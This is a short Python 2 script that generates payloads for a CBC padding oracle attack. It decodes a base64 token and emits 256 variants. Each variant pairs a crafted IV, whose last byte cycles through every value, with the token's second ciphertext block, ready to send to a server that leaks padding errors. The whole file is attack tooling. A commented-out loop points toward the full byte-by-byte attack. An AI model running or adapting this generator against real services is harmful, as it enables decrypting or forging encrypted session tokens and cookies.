#!/usr/bin/env python2
# encoding: utf-8

import base64

block_size = 16

def payload_generator(baseValue):
    try:
        if '-' in baseValue or '_' in baseValue:
            raise TypeError()
        baseValue = base64.standard_b64decode(baseValue)
        urlsafe = False
    except TypeError:
        baseValue = base64.urlsafe_b64decode(baseValue)
        urlsafe = True

    block = baseValue[block_size:block_size*2]

#    for pos in range(block_size, 0, -1):
    for i in range(256):
        guess = '\x00' * (block_size -1) + chr(i)

        if urlsafe:
            yield base64.urlsafe_b64encode(guess + block)
        else:
            yield base64.standard_b64encode(guess + block)


if __name__ == '__main__':
    import sys
    for p in payload_generator(sys.argv[1]):
        print(p)
